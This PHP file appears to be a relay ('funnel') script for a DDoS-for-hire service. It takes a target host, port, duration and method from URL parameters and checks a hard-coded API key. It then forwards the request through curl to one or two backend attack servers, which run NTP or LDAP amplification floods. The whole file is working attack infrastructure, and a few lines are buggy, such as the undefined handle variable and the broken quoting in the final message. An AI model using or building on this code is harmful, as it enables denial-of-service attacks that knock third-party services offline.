<?php

//Basic funnel script in PHP by Krayton

$host = $_GET['host'];
$port = $_GET['port'];
$time = $_GET['time'];
$method = $_GET['method'];
$key = $_GET['key'];

//Methods
$array = array("NTP-FNL", "LDAP-FNL");

//API Key
$ray = array("APIKEY");

//Check if the key is empty
if(!empty($key)) {
} else {
    echo 'User key empty!';
die();
}

//Check if the key matches
if(in_array($key, $ray)) {
} else {
    echo 'User key incorrect!';
die();
}

//Time limit
if($time > 1000){ //Change to whatever time you want
    echo 'You have exceeded your max attack time!';
die();
}

//APIs
if($method == "NTP-FNL") {
    $urls = array(
    'http://serverip1/api.php?key=apikey&host='.$host.'&port='.$port.'&time='.$time.'&method=NTP',
);
}

if($method == "LDAP-FNL") {
    $urls = array(
    'http://serverip1/api.php?key=apikey&host='.$host.'&port='.$port.'&time='.$time.'&method=LDAP',
    'http://serverip2/api.php?key=apikey&host='.$host.'&port='.$port.'&time='.$time.'&method=LDAP',
);
}

//Initiate a multiple curl handle
$mh = curl_multi_init();

//Loop through the API urls
foreach($urls as $srv => $url){
    $requests[$srv] = array();
    $requests[$srv]['url'] = $url;
    
    //start a normal new curl handle
    $requests[$srv]['curl_handle'] = curl_init($url);
    
    curl_setopt($requests[$srv]['curl_handle'], CURLOPT_RETURNTRANSFER, true);
    curl_setopt($requests[$srv]['curl_handle'], CURLOPT_CONNECTTIMEOUT, 1);
    curl_setopt($requests[$srv]['curl_handle'], CURLOPT_TIMEOUT, 1);
    curl_multi_add_handle($mh, $requests[$srv]['curl_handle']);
}


//Execute the request using curl_multi_exec
$stillRunning = false;
do {
    curl_multi_exec($mh, $stillRunning);
} while ($stillRunning);

//Loop through the requests that were executed
foreach($requests as $srv => $request) {
    
    //Remove handle from multi handle
    curl_multi_remove_handle($mh, $request['curl_handle']);
    
    //Response content and status code
    $requests[$srv]['content'] = curl_multi_getcontent($request['curl_handle']);
    $requests[$srv]['http_code'] = curl_getinfo($request['curl_handle'], CURLINFO_HTTP_CODE);
    
    //Close handle
    curl_close($requests[$k]['curl_handle']);
}

//Close the multi handle.
curl_multi_close($mh);

//All is a success? Echo it.
echo "Attack has been sent to: '.$host.':'.$port.' for '.$time.'s using '.$method.'!";

?>
